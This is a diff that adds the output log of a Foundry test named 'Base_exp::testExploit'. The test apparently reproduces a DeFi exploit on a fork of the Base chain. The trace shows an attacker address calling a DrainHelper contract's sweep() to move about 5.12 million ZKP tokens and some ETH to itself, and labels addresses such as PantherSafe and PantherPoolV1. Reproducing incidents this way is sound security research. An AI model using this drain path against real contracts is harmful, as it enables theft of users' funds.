@@ -1,0 +1,80 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/Base_exp.sol:Base_exp
+[PASS] testExploit() (gas: 91392)
+Logs:
+  Attacker Before exploit ZKP Balance: 0.000000000000000000
+  Helper ZKP before sweep: 5124773.626006184526790998
+  Attacker ZKP profit: 5124773.626006184526790998
+  Attacker After exploit ZKP Balance: 5124773.626006184526790998
+
+Traces:
+  [32689] Base_exp::setUp()
+    ├─ [0] VM::envOr("BASE_RPC_URL", "http://127.0.0.1:8545") [staticcall]
+    │   └─ ← [Return] <env var value>
+    ├─ [0] VM::createSelectFork("<rpc url>", 49625945 [4.962e7])
+    │   └─ ← [Return] 1
+    └─ ← [Stop]
+
+  [96192] Base_exp::testExploit()
+    ├─ [3264] ZKP::symbol() [staticcall]
+    │   └─ ← [Return] "ZKP"
+    ├─ [2562] ZKP::balanceOf(Attacker: [0x7dB4cFea07042ca13a8E26cC90BbB59982Fe95B6]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [251] ZKP::decimals() [staticcall]
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: "Attacker Before exploit ZKP Balance", val: 0, decimals: 18)
+    ├─ [0] VM::label(Attacker: [0x7dB4cFea07042ca13a8E26cC90BbB59982Fe95B6], "Attacker")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(DrainHelper: [0x9400161d512C740e1C0C77f3c931D112f068210c], "DrainHelper")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(ZKP: [0x0a776C1c22b8b8e7EAB346744dAA33722b80FdA4], "ZKP")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(PantherSafe: [0xb16283A233D5b010A7b290d593847207495F0284], "PantherSafe")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(RealityModule: [0x4ce69e77A8806B51f15b8D0FC38A9c1f66A851b4], "RealityModule")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(ZkpReserveController: [0xEEA28cf0837306041FA53187F0802aC95228CD45], "ZkpReserveController")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(EIP173ProxyA: [0x70c69bB8501b30cf112403139a383BF978f4A31e], "EIP173ProxyA")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(PantherPoolV1: [0x5335839b374e6B2C8b9F0b4930e7EAE3192Ce16C], "PantherPoolV1")
+    │   └─ ← [Return]
+    ├─ [2562] ZKP::balanceOf(DrainHelper: [0x9400161d512C740e1C0C77f3c931D112f068210c]) [staticcall]
+    │   └─ ← [Return] 5124773626006184526790998 [5.124e24]
+    ├─ emit log_named_decimal_uint(key: "Helper ZKP before sweep", val: 5124773626006184526790998 [5.124e24], decimals: 18)
+    ├─ [562] ZKP::balanceOf(Attacker: [0x7dB4cFea07042ca13a8E26cC90BbB59982Fe95B6]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::startPrank(Attacker: [0x7dB4cFea07042ca13a8E26cC90BbB59982Fe95B6], Attacker: [0x7dB4cFea07042ca13a8E26cC90BbB59982Fe95B6])
+    │   └─ ← [Return]
+    ├─ [39858] DrainHelper::sweep()
+    │   ├─ [562] ZKP::balanceOf(DrainHelper: [0x9400161d512C740e1C0C77f3c931D112f068210c]) [staticcall]
+    │   │   └─ ← [Return] 5124773626006184526790998 [5.124e24]
+    │   ├─ [25764] ZKP::transfer(Attacker: [0x7dB4cFea07042ca13a8E26cC90BbB59982Fe95B6], 5124773626006184526790998 [5.124e24])
+    │   │   ├─ emit Transfer(from: DrainHelper: [0x9400161d512C740e1C0C77f3c931D112f068210c], to: Attacker: [0x7dB4cFea07042ca13a8E26cC90BbB59982Fe95B6], amount: 5124773626006184526790998 [5.124e24])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x671bdf6e9e87471ec116e753d4b2bd31a9a37325c79f47f09f616a8e6cd330e4: 0x000000000000000000000000000000000000000000043d3688f1de434b5ec156 → 0
+    │   │   │   @ 0x661ebd64f44df24c7465cd77c745a33cf026c2208c05d2954dd87472489db06a: 0 → 0x000000000000000000000000000000000000000000043d3688f1de434b5ec156
+    │   │   └─ ← [Return] true
+    │   ├─ [2457] 0x4200000000000000000000000000000000000006::balanceOf(DrainHelper: [0x9400161d512C740e1C0C77f3c931D112f068210c]) [staticcall]
+    │   │   └─ ← [Return] 0
+    │   ├─ [0] Attacker::fallback{value: 123291500437368375}()
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return]
+    ├─ [0] VM::stopPrank()
+    │   └─ ← [Return]
+    ├─ [562] ZKP::balanceOf(Attacker: [0x7dB4cFea07042ca13a8E26cC90BbB59982Fe95B6]) [staticcall]
+    │   └─ ← [Return] 5124773626006184526790998 [5.124e24]
+    ├─ emit log_named_decimal_uint(key: "Attacker ZKP profit", val: 5124773626006184526790998 [5.124e24], decimals: 18)
+    ├─ [1264] ZKP::symbol() [staticcall]
+    │   └─ ← [Return] "ZKP"
+    ├─ [562] ZKP::balanceOf(Attacker: [0x7dB4cFea07042ca13a8E26cC90BbB59982Fe95B6]) [staticcall]
+    │   └─ ← [Return] 5124773626006184526790998 [5.124e24]
+    ├─ [251] ZKP::decimals() [staticcall]
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: "Attacker After exploit ZKP Balance", val: 5124773626006184526790998 [5.124e24], decimals: 18)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 9.92ms (2.85ms CPU time)
+
+Ran 1 test suite in 1.25s (9.92ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
